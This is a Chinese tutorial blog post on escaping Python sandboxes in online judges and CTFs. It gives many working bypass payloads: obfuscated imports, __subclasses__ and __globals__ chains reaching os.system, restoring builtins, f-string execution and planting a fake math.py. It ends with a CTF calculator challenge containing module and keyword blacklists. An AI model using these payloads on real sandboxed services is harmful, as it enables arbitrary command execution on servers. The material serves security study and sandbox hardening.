**让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python
代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。**

## 前言

Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。

顺便安利一本书：《流畅的 Python》。这本书有很多中高阶知识点，很全面而且讲的很清楚，如果你看过，相信理解这篇文章的大多数内容都不是问题。

接下来的内容先讲系统命令执行，再讲文件写入、读取，并且均以 oj 为例，库大多以 `os` 为例。

## 执行系统命令

### 基础知识

先啰嗦一些基础知识

在 Python 中执行系统命令的方式有：

> os
>
> commands：仅限`2.x`
>
> subprocess
>
> timeit：`timeit.sys`、`timeit.timeit("__import__('os').system('whoami')",
> number=1)`
>
> platform：`platform.os`、`platform.sys`、`platform.popen('whoami', mode='r',
> bufsize=-1).read()`
>
> pty：`pty.spawn('ls')`、`pty.os`
>
> bdb：`bdb.os`、`cgi.sys`
>
> cgi：`cgi.os`、`cgi.sys`
>
> ...

我写了一个脚本，测试了一下所有的导入 `os` 或者 `sys` 的库：

    
    
    #-*- coding:utf8 -*-    # By Macr0phag3
    # in 2019-05-07 19:46:12
    # ------------------------------------    
    # this, antigravity 库删掉
    all_modules_2 = [
        'BaseHTTPServer', 'imaplib', 'shelve', 'Bastion', 'anydbm', 'imghdr', 'shlex', 'CDROM', 'argparse', 'imp', 'shutil', 'CGIHTTPServer', 'array', 'importlib', 'signal', 'Canvas', 'ast', 'imputil', 'site', 'ConfigParser', 'asynchat', 'inspect', 'sitecustomize', 'Cookie', 'asyncore', 'io', 'smtpd', 'DLFCN', 'atexit', 'itertools', 'smtplib', 'Dialog', 'audiodev', 'json', 'sndhdr', 'DocXMLRPCServer', 'audioop', 'keyword', 'socket', 'FileDialog', 'base64', 'lib2to3', 'spwd', 'FixTk', 'bdb', 'linecache', 'sqlite3', 'HTMLParser', 'binascii', 'linuxaudiodev', 'sre', 'IN', 'binhex', 'locale', 'sre_compile', 'MimeWriter', 'bisect', 'logging', 'sre_constants', 'Queue', 'bsddb', 'lsb_release', 'sre_parse', 'ScrolledText', 'bz2', 'macpath', 'ssl', 'SimpleDialog', 'cPickle', 'macurl2path', 'stat', 'SimpleHTTPServer', 'cProfile', 'mailbox', 'statvfs', 'SimpleXMLRPCServer', 'cStringIO', 'mailcap', 'string', 'SocketServer', 'calendar', 'markupbase', 'stringold', 'StringIO', 'cgi', 'marshal', 'stringprep', 'TYPES', 'cgitb', 'math', 'strop', 'Tix', 'chunk', 'md5', 'struct', 'Tkconstants', 'cmath', 'mhlib', 'subprocess', 'Tkdnd', 'cmd', 'mimetools', 'sunau', 'Tkinter', 'code', 'mimetypes', 'sunaudio', 'UserDict', 'codecs', 'mimify', 'symbol', 'UserList', 'codeop', 'mmap', 'symtable', 'UserString', 'collections', 'modulefinder', 'sys', '_LWPCookieJar', 'colorsys', 'multifile', 'sysconfig', '_MozillaCookieJar', 'commands', 'multiprocessing', 'syslog', '__builtin__', 'compileall', 'mutex', 'tabnanny', '__future__', 'compiler', 'netrc', 'talloc', '_abcoll', 'contextlib', 'new', 'tarfile', '_ast', 'cookielib', 'nis', 'telnetlib', '_bisect', 'copy', 'nntplib', 'tempfile', '_bsddb', 'copy_reg', 'ntpath', 'termios', '_codecs', 'crypt', 'nturl2path', 'test', '_codecs_cn', 'csv', 'numbers', 'textwrap', '_codecs_hk', 'ctypes', 'opcode', '_codecs_iso2022', 'curses', 'operator', 'thread', '_codecs_jp', 'datetime', 'optparse', 'threading', '_codecs_kr', 'dbhash', 'os', 'time', '_codecs_tw', 'dbm', 'os2emxpath', 'timeit', '_collections', 'decimal', 'ossaudiodev', 'tkColorChooser', '_csv', 'difflib', 'parser', 'tkCommonDialog', '_ctypes', 'dircache', 'pdb', 'tkFileDialog', '_ctypes_test', 'dis', 'pickle', 'tkFont', '_curses', 'distutils', 'pickletools', 'tkMessageBox', '_curses_panel', 'doctest', 'pipes', 'tkSimpleDialog', '_elementtree', 'dumbdbm', 'pkgutil', 'toaiff', '_functools', 'dummy_thread', 'platform', 'token', '_hashlib', 'dummy_threading', 'plistlib', 'tokenize', '_heapq', 'email', 'popen2', 'trace', '_hotshot', 'encodings', 'poplib', 'traceback', '_io', 'ensurepip', 'posix', 'ttk', '_json', 'errno', 'posixfile', 'tty', '_locale', 'exceptions', 'posixpath', 'turtle', '_lsprof', 'fcntl', 'pprint', 'types', '_md5', 'filecmp', 'profile', 'unicodedata', '_multibytecodec', 'fileinput', 'pstats', 'unittest', '_multiprocessing', 'fnmatch', 'pty', 'urllib', '_osx_support', 'formatter', 'pwd', 'urllib2', '_pyio', 'fpformat', 'py_compile', 'urlparse', '_random', 'fractions', 'pyclbr', 'user', '_sha', 'ftplib', 'pydoc', 'uu', '_sha256', 'functools', 'pydoc_data', 'uuid', '_sha512', 'future_builtins', 'pyexpat', 'warnings', '_socket', 'gc', 'quopri', 'wave', '_sqlite3', 'genericpath', 'random', 'weakref', '_sre', 'getopt', 're', 'webbrowser', '_ssl', 'getpass', 'readline', 'whichdb', '_strptime', 'gettext', 'repr', 'wsgiref', '_struct', 'glob', 'resource', 'xdrlib', '_symtable', 'grp', 'rexec', 'xml', '_sysconfigdata', 'gzip', 'rfc822', 'xmllib', '_sysconfigdata_nd', 'hashlib', 'rlcompleter', 'xmlrpclib', '_testcapi', 'heapq', 'robotparser', 'xxsubtype', '_threading_local', 'hmac', 'runpy', 'zipfile', '_warnings', 'hotshot', 'sched', 'zipimport', '_weakref', 'htmlentitydefs', 'select', 'zlib', '_weakrefset', 'htmllib', 'sets', 'abc', 'httplib', 'sgmllib', 'aifc', 'ihooks', 'sha'
    ]
    
    all_modules_3 = [
        'AptUrl', 'hmac', 'requests_unixsocket', 'CommandNotFound', 'apport', 'hpmudext', 'resource', 'Crypto', 'apport_python_hook', 'html', 'rlcompleter', 'DistUpgrade', 'apt', 'http', 'runpy', 'HweSupportStatus', 'apt_inst', 'httplib2', 'scanext', 'LanguageSelector', 'apt_pkg', 'idna', 'sched', 'NvidiaDetector', 'aptdaemon', 'imaplib', 'secrets', 'PIL', 'aptsources', 'imghdr', 'secretstorage', 'Quirks', 'argparse', 'imp', 'select', 'UbuntuDrivers', 'array', 'importlib', 'selectors', 'UbuntuSystemService', 'asn1crypto', 'inspect', 'shelve', 'UpdateManager', 'ast', 'io', 'shlex', '__future__', 'asynchat', 'ipaddress', 'shutil', '_ast', 'asyncio', 'itertools', 'signal', '_asyncio', 'asyncore', 'janitor', 'simplejson', '_bisect', 'atexit', 'json', 'site', '_blake2', 'audioop', 'keyring', 'sitecustomize', '_bootlocale', 'base64', 'keyword', 'six', '_bz2', 'bdb', 'language_support_pkgs', 'smtpd', '_cffi_backend', 'binascii', 'launchpadlib', 'smtplib', '_codecs', 'binhex', 'linecache', 'sndhdr', '_codecs_cn', 'bisect', 'locale', 'socket', '_codecs_hk', 'brlapi', 'logging', 'socketserver', '_codecs_iso2022', 'builtins', 'louis', 'softwareproperties', '_codecs_jp', 'bz2', 'lsb_release', 'speechd', '_codecs_kr', 'cProfile', 'lzma', 'speechd_config', '_codecs_tw', 'cairo', 'macaroonbakery', 'spwd', '_collections', 'calendar', 'macpath', 'sqlite3', '_collections_abc', 'certifi', 'macurl2path', 'sre_compile', '_compat_pickle', 'cgi', 'mailbox', 'sre_constants', '_compression', 'cgitb', 'mailcap', 'sre_parse', '_crypt', 'chardet', 'mako', 'ssl', '_csv', 'chunk', 'markupsafe', 'stat', '_ctypes', 'cmath', 'marshal', 'statistics', '_ctypes_test', 'cmd', 'math', 'string', '_curses', 'code', 'mimetypes', 'stringprep', '_curses_panel', 'codecs', 'mmap', 'struct', '_datetime', 'codeop', 'modual_test', 'subprocess', '_dbm', 'collections', 'modulefinder', 'sunau', '_dbus_bindings', 'colorsys', 'multiprocessing', 'symbol', '_dbus_glib_bindings', 'compileall', 'nacl', 'symtable', '_decimal', 'concurrent', 'netrc', 'sys', '_dummy_thread', 'configparser', 'nis', 'sysconfig', '_elementtree', 'contextlib', 'nntplib', 'syslog', '_functools', 'copy', 'ntpath', 'systemd', '_gdbm', 'copyreg', 'nturl2path', 'tabnanny', '_hashlib', 'crypt', 'numbers', 'tarfile', '_heapq', 'cryptography', 'oauth', 'telnetlib', '_imp', 'csv', 'olefile', 'tempfile', '_io', 'ctypes', 'opcode', 'termios', '_json', 'cups', 'operator', 'test', '_locale', 'cupsext', 'optparse', 'textwrap', '_lsprof', 'cupshelpers', 'orca', '_lzma', 'curses', 'os', 'threading', '_markupbase', 'datetime', 'ossaudiodev', 'time', '_md5', 'dbm', 'parser', 'timeit', '_multibytecodec', 'dbus', 'pathlib', 'token', '_multiprocessing', 'deb822', 'pcardext', 'tokenize', '_opcode', 'debconf', 'pdb', 'trace', '_operator', 'debian', 'pexpect', 'traceback', '_osx_support', 'debian_bundle', 'pickle', 'tracemalloc', '_pickle', 'decimal', 'pickletools', 'tty', '_posixsubprocess', 'defer', 'pipes', 'turtle', '_pydecimal', 'difflib', 'pkg_resources', 'types', '_pyio', 'dis', 'pkgutil', 'typing', '_random', 'distro_info', 'platform', 'ufw', '_sha1', 'distro_info_test', 'plistlib', 'unicodedata', '_sha256', 'distutils', 'poplib', 'unittest', '_sha3', 'doctest', 'posix', 'urllib', '_sha512', 'dummy_threading', 'posixpath', 'urllib3', '_signal', 'email', 'pprint', 'usbcreator', '_sitebuiltins', 'encodings', 'problem_report', 'uu', '_socket', 'enum', 'profile', 'uuid', '_sqlite3', 'errno', 'pstats', 'venv', '_sre', 'faulthandler', 'pty', 'wadllib', '_ssl', 'fcntl', 'ptyprocess', 'warnings', '_stat', 'filecmp', 'pwd', 'wave', '_string', 'fileinput', 'py_compile', 'weakref', '_strptime', 'fnmatch', 'pyatspi', 'webbrowser', '_struct', 'formatter', 'pyclbr', 'wsgiref', '_symtable', 'fractions', 'pydoc', 'xdg', '_sysconfigdata_m_linux_x86_64-linux-gnu', 'ftplib', 'pydoc_data', 'xdrlib', '_testbuffer', 'functools', 'pyexpat', 'xkit', '_testcapi', 'gc', 'pygtkcompat', 'xml', '_testimportmultiple', 'genericpath', 'pymacaroons', 'xmlrpc', '_testmultiphase', 'getopt', 'pyrfc3339', 'xxlimited', '_thread', 'getpass', 'pytz', 'xxsubtype', '_threading_local', 'gettext', 'queue', 'yaml', '_tracemalloc', 'gi', 'quopri', 'zipapp', '_warnings', 'glob', 'random', 'zipfile', '_weakref', 'grp', 're', 'zipimport', '_weakrefset', 'gtweak', 'readline', 'zlib', '_yaml', 'gzip', 'reportlab', 'zope', 'abc', 'hashlib', 'reprlib', 'aifc', 'heapq'
    ]
    
    methods = ['os', 'sys', '__builtins__']
    
    results = {}
    for module in all_modules_3:
        results[module] = {
            'flag': 0,
            'result': {}
        }
    
        try:
            m = __import__(module)
            attrs = dir(m)
            for method in methods:
                if method in attrs:
                    result = 'yes'
                    results[module]['flag'] = 1
                else:
                    result = 'no'
    
                results[module]['result'][method] = result
    
        except Exception as e:
            print(e)
    
    for result in results:
        if results[result]['flag']:
            print('[+]' + result)
            for r in results[result]['result']:
                print('  [-]' + r + ': ' + results[result]['result'][r])
    

`all_modules_2`就是 2.x 的标准库，`all_modules_3` 就是 3.x 的标准库。

结果相当多，这里就不贴了。这里注意一下，这个文件别命名为 `test.py`，如果命名为 test 会怎么样呢？可以先猜一猜，后面会给解释。

如果 oj 支持 `import` 的话，这些库都是高危的，放任不管基本上是坐等被日。所以为了避免过滤不完善导致各种问题，在 Python 沙箱套一层
docker 肯定不会是坏事。

### 花式 import

首先，禁用 `import os` 肯定是不行的，因为

    
    
    import  os
    import   os
    import    os
    ...
    

都可以。如果多个空格也过滤了，Python 能够 import 的可不止 `import`，还有
`__import__`：`__import__('os')`，`__import__`被干了还有
`importlib`：`importlib.import_module('os').system('ls')`

这样就安全了吗？实际上`import`可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用
`execfile` 来代替：

    
    
    execfile('/usr/lib/python2.7/os.py')
    system('ls')
    

不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：

    
    
    with open('/usr/lib/python3.6/os.py','r') as f:
        exec(f.read())
    system('ls')
    

这个方法倒是 2.x、3.x 通用的。

不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：

    
    
    import sys
    print(sys.path)
    

### 花式处理字符串

代码中要是出现 `os`，直接不让运行。那么可以利用字符串的各种变化来引入 os：

    
    
    __import__('so'[::-1]).system('ls')
    
    
    
    b = 'o'
    a = 's'
    __import__(a+b).system('ls')
    

还可以利用 `eval` 或者 `exec`：

    
    
    >>> eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
    macr0phag3
    0
    >>> exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
    macr0phag3
    

顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval
还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13...等等，太多了。。。

### 恢复 sys.modules

`sys.modules` 是一个字典，里面储存了加载过的模块信息。如果 Python
是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 `os` 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules
中未经 import 加载的模块对当前空间是不可见的。

如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：

    
    
    >>> sys.modules['os'] = 'not allowed'
    >>> import os
    >>> os.system('ls')
    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
    AttributeError: 'str' object has no attribute 'system'
    >>>
    

注意，这里不能用 `del sys.modules['os']`，因为，当 import 一个模块时：import A，检查 sys.modules
中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。

所以删了 `sys.modules['os']` 只会让 Python 重新加载一次 os。

看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：

    
    
    sys.modules['os'] = 'not allowed' # oj 为你加的
    
    del sys.modules['os']
    import os
    os.system('ls')
    

最后还有一种利用 `__builtins__` 导入的方式，下面会详细说。

### 花式执行函数

通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system
这个函数干掉，也没法通过`os.system`执行系统命令，并且这里的`system`也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在`/usr/lib/python2.7/os.py`中删了`system`函数。。。

不过，要明确的是，os 中能够执行系统命令的函数有很多：

    
    
    print(os.system('whoami'))
    print(os.popen('whoami').read()) 
    print(os.popen2('whoami').read()) # 2.x
    print(os.popen3('whoami').read()) # 2.x
    print(os.popen4('whoami').read()) # 2.x
    ...
    

应该还有一些，可以在这里找找：

[2.x 传送门](https://docs.python.org/2/library/os.html)

[3.x 传送门](https://docs.python.org/3/library/os.html)

过滤`system`的时候说不定还有其他函数给漏了。

其次，可以通过 `getattr` 拿到对象的方法、属性：

    
    
    import os
    getattr(os, 'metsys'[::-1])('whoami')
    

不让出现 import也没事：

    
    
    >>> getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')
    macr0phag3
    0
    

一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 `__builtins__`，见下文。

与 `getattr` 相似的还有
`__getattr__`、`__getattribute__`，它们自己的区别就是`getattr`相当于`class.attr`，都是获取类属性/方法的一种方式，在获取的时候会触发`__getattribute__`，如果`__getattribute__`找不到，则触发`__getattr__`，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。

### builtins、 **builtin** 与 **builtins**

先说一下，`builtin`、`builtins`，`__builtin__`与`__builtins__`的区别：首先我们知道，在 Python
中，有很多函数不需要任何 import 就可以直接使用，例如`chr`、`open`。之所以可以这样，是因为 Python
有个叫`内建模块`（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 `LEGB`
规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。

在 2.x 版本中，内建模块被命名为 `__builtin__`，到了 3.x 就成了 `builtins`。它们都需要 import 才能查看：

2.x：

    
    
    >>> import __builtin__
    >>> __builtin__
    <module '__builtin__' (built-in)>
    

3.x：

    
    
    >>> import builtins
    >>> builtins
    <module 'builtins' (built-in)>
    

但是，`__builtins__` 两者都有，实际上是`__builtin__`和`builtins` 的引用。它不需要导入，我估计是为了统一 2.x 和
3.x。不过`__builtins__`与`__builtin__`和`builtins`是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，`__builtins__`
相对实用一点，并且在 `__builtins__`里有很多好东西：

    
    
    >>> '__import__' in dir(__builtins__)
    True
    >>> __builtins__.__dict__['__import__']('os').system('whoami')
    macr0phag3
    0
    >>> 'eval' in dir(__builtins__)
    True
    >>> 'execfile' in dir(__builtins__)
    True
    

那么既然`__builtins__`有这么多危险的函数，不如将里面的危险函数破坏了：

    
    
    __builtins__.__dict__['eval'] = 'not allowed'
    

或者直接删了：

    
    
    del __builtins__.__dict__['eval']
    

但是我们可以利用 `reload(__builtins__)` 来恢复 `__builtins__`。不过，我们在使用 `reload`
的时候也没导入，说明`reload`也在
`__builtins__`里，那如果连`reload`都从`__builtins__`中删了，就没法恢复`__builtins__`了，需要另寻他法。还有一种情况是利用
`exec command in _global` 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。

这里注意，2.x 的 `reload` 是内建的，3.x 需要 `import imp`，然后再 `imp.reload`。你看，reload 的参数是
`module`，所以肯定还能用于重新载入其他模块，这个放在下面说。

### 通过继承关系逃逸

在 Python 中提到继承就不得不提 `mro`，`mro`就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A
的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x
中新式类一统江湖，默认继承 `object`，当然也是使用的 C3
搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python
中新式类都有个属性，叫`__mro__`，是个元组，记录了继承关系：

    
    
    >>> ''.__class__.__mro__
    (<class 'str'>, <class 'object'>)
    

类的实例在获取 `__class__` 属性时会指向该实例对应的类。可以看到，`''`属于 `str`类，它继承了 `object`
类，这个类是所有类的超类。具有相同功能的还有`__base__`和`__bases__`。需要注意的是，经典类需要指明继承 object
才会继承它，否则是不会继承的：

    
    
    >>> class test:
    ...     pass
    ...
    >>> test.__bases__
    >>> class test(object):
    ...     pass
    ...
    >>> test.__bases__
    (<type 'object'>,)
    

那么知道这个有什么用呢？

由于没法直接引入 os，那么假如有个库叫`oos`，在`oos`中引入了`os`，那么我们就可以通过`__globals__`拿到
os（`__globals__`是函数所在的全局命名空间中所定义的全局变量）。例如，`site` 这个库就有 `os`：

    
    
    >>> import site
    >>> site.os
    <module 'os' from '/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py'>
    

也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 `import site`。可以利用
`reload`，变相加载 `os`：

    
    
    >>> import site
    >>> os
    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
    NameError: name 'os' is not defined
    >>> os = reload(site.os)
    >>> os.system('whoami')
    macr0phag3
    0
    

还有，既然所有的类都继承的`object`，那么我们先用`__subclasses__`看看它的子类，以 2.x 为例：

    
    
    >>> for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
    ...
    (0, <type 'type'>)
    (1, <type 'weakref'>)
    (2, <type 'weakcallableproxy'>)
    (3, <type 'weakproxy'>)
    (4, <type 'int'>)
    (5, <type 'basestring'>)
    (6, <type 'bytearray'>)
    (7, <type 'list'>)
    (8, <type 'NoneType'>)
    (9, <type 'NotImplementedType'>)
    (10, <type 'traceback'>)
    (11, <type 'super'>)
    (12, <type 'xrange'>)
    (13, <type 'dict'>)
    (14, <type 'set'>)
    (15, <type 'slice'>)
    (16, <type 'staticmethod'>)
    (17, <type 'complex'>)
    (18, <type 'float'>)
    (19, <type 'buffer'>)
    (20, <type 'long'>)
    (21, <type 'frozenset'>)
    (22, <type 'property'>)
    (23, <type 'memoryview'>)
    (24, <type 'tuple'>)
    (25, <type 'enumerate'>)
    (26, <type 'reversed'>)
    (27, <type 'code'>)
    (28, <type 'frame'>)
    (29, <type 'builtin_function_or_method'>)
    (30, <type 'instancemethod'>)
    (31, <type 'function'>)
    (32, <type 'classobj'>)
    (33, <type 'dictproxy'>)
    (34, <type 'generator'>)
    (35, <type 'getset_descriptor'>)
    (36, <type 'wrapper_descriptor'>)
    (37, <type 'instance'>)
    (38, <type 'ellipsis'>)
    (39, <type 'member_descriptor'>)
    (40, <type 'file'>)
    (41, <type 'PyCapsule'>)
    (42, <type 'cell'>)
    (43, <type 'callable-iterator'>)
    (44, <type 'iterator'>)
    (45, <type 'sys.long_info'>)
    (46, <type 'sys.float_info'>)
    (47, <type 'EncodingMap'>)
    (48, <type 'fieldnameiterator'>)
    (49, <type 'formatteriterator'>)
    (50, <type 'sys.version_info'>)
    (51, <type 'sys.flags'>)
    (52, <type 'exceptions.BaseException'>)
    (53, <type 'module'>)
    (54, <type 'imp.NullImporter'>)
    (55, <type 'zipimport.zipimporter'>)
    (56, <type 'posix.stat_result'>)
    (57, <type 'posix.statvfs_result'>)
    (58, <class 'warnings.WarningMessage'>)
    (59, <class 'warnings.catch_warnings'>)
    (60, <class '_weakrefset._IterationGuard'>)
    (61, <class '_weakrefset.WeakSet'>)
    (62, <class '_abcoll.Hashable'>)
    (63, <type 'classmethod'>)
    (64, <class '_abcoll.Iterable'>)
    (65, <class '_abcoll.Sized'>)
    (66, <class '_abcoll.Container'>)
    (67, <class '_abcoll.Callable'>)
    (68, <type 'dict_keys'>)
    (69, <type 'dict_items'>)
    (70, <type 'dict_values'>)
    (71, <class 'site._Printer'>)
    (72, <class 'site._Helper'>)
    (73, <type '_sre.SRE_Pattern'>)
    (74, <type '_sre.SRE_Match'>)
    (75, <type '_sre.SRE_Scanner'>)
    (76, <class 'site.Quitter'>)
    (77, <class 'codecs.IncrementalEncoder'>)
    (78, <class 'codecs.IncrementalDecoder'>)
    

可以看到，site 就在里面，以 2.x 的`site._Printer`为例：

    
    
    >>> ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']
    <module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'>
    

os 又回来了。并且 site 中还有 `__builtins__`。

这个方法不仅限于 A->os，还阔以是 A->B->os，比如 2.x 中的 `warnings`：

    
    
    >>> import warnings
    >>> 
    >>> warnings.os
    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
    AttributeError: 'module' object has no attribute 'os'
    >>> 
    >>> warnings.linecache
    <module 'linecache' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc'>
    >>>
    >>> warnings.linecache.os
    <module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'>
    

在继承链中就可以这样：

    
    
    >>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')
    macr0phag3
    0
    

顺便说一下，`warnings`这个库中有个函数：`warnings.catch_warnings`，它有个`_module`属性：

    
    
        def __init__(self, record=False, module=None):
    ...
            self._module = sys.modules['warnings'] if module is None else module
    ...
    

所以通过`_module`也可以构造 payload：

    
    
    >>> [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.linecache.os.system('whoami')
    macr0phag3
    0
    

3.x 中的`warnings`虽然没有 `linecache`，也有`__builtins__`。

同样，py3.x 中有`<class 'os._wrap_close'>`，利用方式可以为：

    
    
    >>> ''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['system']('whoami')
    macr0phag3
    0
    

顺便提一下，`object` 本来就是可以使用的，如果没过滤这个变量的话，payload 可以简化为：

    
    
    object.__subclasses__()[117].__init__.__globals__['system']('whoami')
    

还有一种是利用`builtin_function_or_method` 的 `__call__`：

    
    
    "".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')
    

或者简单一点：

    
    
    [].__getattribute__('append').__class__.__call__(eval, '1+1')
    

还可以这样利用：

    
    
    class test(dict):
        def __init__(self):
            print(super(test, self).keys.__class__.__call__(eval, '1+1'))
            # 如果是 3.x 的话可以简写为：
            # super().keys.__class__.__call__(eval, '1+1'))
    test()
    

上面的这些利用方式总结起来就是通过`__class__`、`__mro__`、`__subclasses__`、`__bases__`等等属性/方法去获取
`object`，再根据`__globals__`找引入的`__builtins__`或者`eval`等等能够直接被利用的库，或者找到`builtin_function_or_method`类/类型`__call__`后直接运行`eval`。

最后，继承链的逃逸还有一些利用第三方库的方式，比如 `jinja2`，这类利用方式应该是叫
`SSTI`，可以看这个：[传送门](https://0day.work/jinja2-template-injection-filter-bypasses/)，这里就不多说了。

## 文件读写

2.x 有个内建的 `file`：

    
    
    >>> file('key').read()
    'Macr0phag3\n'
    >>> file('key', 'w').write('Macr0phag3')
    >>> file('key').read()
    'Macr0phag3'
    

还有个 `open`，2.x 与 3.x 通用。

还有一些库，例如：`types.FileType`(rw)、`platform.popen`(rw)、`linecache.getlines`(r)。

为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为`math.py`，然后 import 进来：

math.py：

    
    
    import os
    
    print(os.system('whoami'))
    

调用

    
    
    >>> import math
    macr0phag3
    0
    

这里需要注意的是，这里 py
文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在`sys.modules`中有的，这些库无法这样利用，会直接从`sys.modules`中加入，比如`re`：

    
    
    >>> 're' in sys.modules
    True
    >>> 'math' in sys.modules
    False
    >>>
    

当然在`import re` 之前`del sys.modules['re']`也不是不可以...

最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 `test`的，如果把遍历测试的文件也命名为
test，会导致那个文件运行 2 次，因为自己 import 了自己。

读文件暂时没什么发现特别的地方。

剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：

    
    
    >>> __builtins__.open('key').read()
    'Macr0phag3\n'
    

或者

    
    
    >>> ().__class__.__base__.__subclasses__()[40]('key').read()
    'Macr0phag3'
    

## 其他

过滤`[`、`]`：这个行为不像是 oj 会做得出来的，ctf 倒是有可能出现。应对的方式就是将`[]`的功能用`pop` 、`__getitem__`
代替（实际上`a[0]`就是在内部调用了`a.__getitem__(0)` ）：

    
    
     >>> ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('whoami').read()
     'macr0phag3\n'
    

利用新特性：PEP 498 引入了 `f-string`，在 3.6
开始出现：[传送门](https://docs.python.org/3.6/whatsnew/3.6.html#new-features)，食用方式：[传送门](https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings)。所以我们就有了一种船新的利用方式：

    
    
    >>> f'{__import__("os").system("whoami")}'
    macr0phag3
    '0'
    

关注每次版本增加的新特性，或许能淘到点宝贝。

序列化相关：序列化也是能用来逃逸，但是关于序列化的安全问题还挺多的，如果有时间我再写一篇文章来讨论好了。

## 栗子

这个例子来自`iscc 2016`的`Pwn300 pycalc`，相当有趣：

    
    
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    
    def banner():
        print "============================================="
        print "   Simple calculator implemented by python   "
        print "============================================="
        return
    
    def getexp():
        return raw_input(">>> ")
    
    def _hook_import_(name, *args, **kwargs):
        module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',
                            'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',
                            'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',
                            'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',
                            'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',
                            'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',
                            'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',
                            'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',
                            'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',
                            'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',
                            'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',
                            'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',
                            'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']
        for forbid in module_blacklist:
            if name == forbid:        # don't let user import these modules
                raise RuntimeError('No you can\' import {0}!!!'.format(forbid))
        # normal modules can be imported
        return __import__(name, *args, **kwargs)
    
    def sandbox_filter(command):
        blacklist = ['exec', 'sh', '__getitem__', '__setitem__',
                     '=', 'open', 'read', 'sys', ';', 'os']
        for forbid in blacklist:
            if forbid in command:
                return 0
        return 1
    
    def sandbox_exec(command):      # sandbox user input
        result = 0
        __sandboxed_builtins__ = dict(__builtins__.__dict__)
        __sandboxed_builtins__['__import__'] = _hook_import_    # hook import
        del __sandboxed_builtins__['open']
        _global = {
            '__builtins__': __sandboxed_builtins__
        }
        if sandbox_filter(command) == 0:
            print 'Malicious user input detected!!!'
            exit(0)
        command = 'result = ' + command
        try:
            exec command in _global     # do calculate in a sandboxed environment
        except Exception, e:
            print e
            return 0
        result = _global['result']  # extract the result
        return result
    
    banner()
    while 1:
        command = getexp()
        print sandbox_exec(command)
    

